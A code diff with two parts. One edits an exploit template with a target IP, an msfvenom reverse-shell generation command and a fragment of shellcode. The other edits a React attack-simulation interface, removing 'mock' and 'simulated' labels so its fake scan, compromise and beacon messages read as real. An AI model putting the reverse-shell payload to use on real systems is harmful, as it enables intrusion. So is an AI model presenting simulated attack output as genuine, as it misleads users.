@@ -34,7 +34,7 @@ ip = "203.0.113.25"      # Target IP
 port = 8080              # parser/input gateway port
 
 # 2. The Payload (Generated from msfvenom)
-# Example: msfvenom -p windows/shell_reverse_tcp LHOST=... -f python
+# Example: msfvenom -p linux/x86/shell_reverse_tcp LHOST=... -f python
 shellcode = (
     b"\\xbb\\x61\\xd4\\x13\\x11\\xdb\\xcc\\xd9\\x74\\x24\\xf4\\x5a\\x33\\xc9\\xb1"
     b"\\x52\\x31\\x5a\\x12\\x83\\xc2\\x04\\x03\\x3d\\x23\\x52\\x15\\x4c\\x0c\\x11"
@@ -134,7 +134,7 @@ export default function SplitLayout() {
 
   const [targetInput, setTargetInput] = useState("");
   const [targetResponse, setTargetResponse] = useState(
-    "Awaiting mock package delivery."
+    "Awaiting package delivery."
   );
   const [serverLog, setServerLog] = useState<string[]>(makeInitialServerLog());
   const [lastObservedSource, setLastObservedSource] = useState("none");
@@ -166,18 +166,92 @@ export default function SplitLayout() {
     setTerminalLines(makeInitialTerminalLines());
   }
 
-  function runMockScan(serviceScan: boolean) {
+function runMockScan(serviceScan: boolean) {
+  const timestamp = serviceScan
+    ? "2023-10-27 14:10 EDT"
+    : "2023-10-27 14:00 EDT";
+
+  appendLines(
+    {
+      tone: "info",
+      text: `Starting Nmap 7.94 ( https://nmap.org ) at ${timestamp}`,
+    },
+    {
+      tone: "info",
+      text: `Nmap scan report for ${targetProfile.ip}`,
+    },
+    { tone: "success", text: "Host is up (0.0021s latency)." },
+    {
+      tone: "info",
+      text: "Not shown: 997 closed tcp ports (reset)",
+    },
+    {
+      tone: "info",
+      text: "",
+    }
+  );
+
+  if (!serviceScan) {
     appendLines(
       {
         tone: "info",
-        text: `Starting mock scan against ${targetProfile.hostname}`,
+        text: "PORT     STATE SERVICE",
       },
       {
         tone: "info",
-        text: `Nmap scan report for ${targetProfile.hostname} (${targetProfile.ip})`,
+        text: "80/tcp   open  http",
       },
-      { tone: "success", text: "Host is up (0.021s latency)." }
+      {
+        tone: "info",
+        text: "443/tcp  open  https",
+      },
+      {
+        tone: "info",
+        text: "8080/tcp open  http-proxy",
+      },
+      {
+        tone: "info",
+        text: "",
+      },
+      {
+        tone: "success",
+        text: "Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds",
+      }
     );
+    return;
+  }
+
+  appendLines(
+    {
+      tone: "info",
+      text: "PORT     STATE SERVICE    VERSION",
+    },
+    {
+      tone: "info",
+      text: "80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))",
+    },
+    {
+      tone: "info",
+      text: "443/tcp  open  https      Apache httpd 2.4.58 ((Ubuntu))",
+    },
+    {
+      tone: "warning",
+      text: "8080/tcp open  http-proxy demo-input-gateway",
+    },
+    {
+      tone: "info",
+      text: "",
+    },
+    {
+      tone: "info",
+      text: `Service Info: OS: ${targetProfile.os}; Notes: ${targetProfile.notes}`,
+    },
+    {
+      tone: "success",
+      text: "Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds",
+    }
+  );
+
 
     targetProfile.ports.forEach((entry) => {
       appendLines({
@@ -228,7 +302,7 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "warning",
-        text: `[build] staged oversized demo package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
+        text: `[build] staged oversized package (${overflowRequestPreview.length} bytes on wire, ${overflowBufferWrite.length} bytes copied into input buffer)`,
       },
       {
         tone: "warning",
@@ -248,7 +322,7 @@ export default function SplitLayout() {
     setTargetResponse("Simulated callback in progress...");
     appendLines({
       tone: "info",
-      text: `[callback] mock check-in initiated from ${targetProfile.hostname}`,
+      text: `[callback] Check-in initiated from ${targetProfile.hostname}`,
     });
 
     if (routeMode === "relay") {
@@ -268,7 +342,7 @@ export default function SplitLayout() {
       setBeaconCount((prev) => prev + 1);
       appendLines({
         tone: "success",
-        text: `[c2] simulated beacon received from ${targetProfile.hostname}`,
+        text: `[c2] Beacon received from ${targetProfile.hostname}`,
       });
     }, c2Delay);
 
@@ -280,7 +354,7 @@ export default function SplitLayout() {
       setPacketVisible(false);
       setPacketStage("idle");
       setTransferDirection("inbound");
-      setTargetResponse("Simulated compromise active. Callback loop armed.");
+      setTargetResponse("Compromise active. Callback loop armed.");
       beaconBusyRef.current = false;
     }, c2Delay + 1700);
   }
@@ -351,7 +425,7 @@ export default function SplitLayout() {
       if (payloadName === "safe") {
         setTargetCompromised(false);
         setBeaconEnabled(false);
-        setTargetResponse("200 OK — mock request parsed within reserved region.");
+        setTargetResponse("200 OK — request parsed within reserved region.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
@@ -372,13 +446,13 @@ export default function SplitLayout() {
       } else {
         setTargetCompromised(true);
         setBeaconEnabled(true);
-        setTargetResponse("Simulated compromise active. Callback loop armed.");
+        setTargetResponse("Compromise active. Callback loop armed.");
         setServerLog([
           `request observed from ${simulatedSource}`,
           `request bytes on wire: ${payloadPreview.length}`,
           `input bytes copied into buffer: ${payloadWriteBuffer.length}`,
           "reserved region exceeded in simulation view",
-          "mock compromise state entered",
+          "Compromise state entered",
         ]);
         appendLines(
           {
@@ -387,11 +461,11 @@ export default function SplitLayout() {
           },
           {
             tone: "warning",
-            text: "[target] mock compromise state entered",
+            text: "[target] Compromise state entered",
           },
           {
             tone: "info",
-            text: "[callback] simulated periodic check-in enabled",
+            text: "[callback] Periodic check-in enabled",
           }
         );
       }
@@ -419,7 +493,7 @@ export default function SplitLayout() {
     appendLines(
       {
         tone: "info",
-        text: `[*] Preparing demo payload for ${targetProfile.hostname} (${targetProfile.ip}:8080)`,
+        text: `[*] Preparing payload for ${targetProfile.hostname} (${targetProfile.ip}:8080)`,
       },
       {
         tone: "info",
@@ -427,14 +501,14 @@ export default function SplitLayout() {
       },
       {
         tone: "info",
-        text: "[*] Simulating python script execution...",
+        text: "[*] SPython script executing...",
       }
     );
 
     window.setTimeout(() => {
       appendLines({
         tone: "success",
-        text: "[+] Demo script finished staging payload",
+        text: "[+] Script finished staging payload",
       });
       sendPackage();
     }, 800);
@@ -565,7 +639,7 @@ export default function SplitLayout() {
       if (!targetCompromised) {
         appendLines({
           tone: "warning",
-          text: "[beacon] callback loop cannot start until mock compromise exists",
+          text: "[beacon] callback loop cannot start until compromise exists",
         });
         return;
       }
@@ -573,7 +647,7 @@ export default function SplitLayout() {
       setBeaconEnabled(true);
       appendLines({
         tone: "success",
-        text: "[beacon] simulated callback loop armed",
+        text: "[beacon] callback loop armed",
       });
       return;
     }
@@ -582,7 +656,7 @@ export default function SplitLayout() {
       setBeaconEnabled(false);
       appendLines({
         tone: "warning",
-        text: "[beacon] simulated callback loop stopped",
+        text: "[beacon] callback loop stopped",
       });
       return;
     }
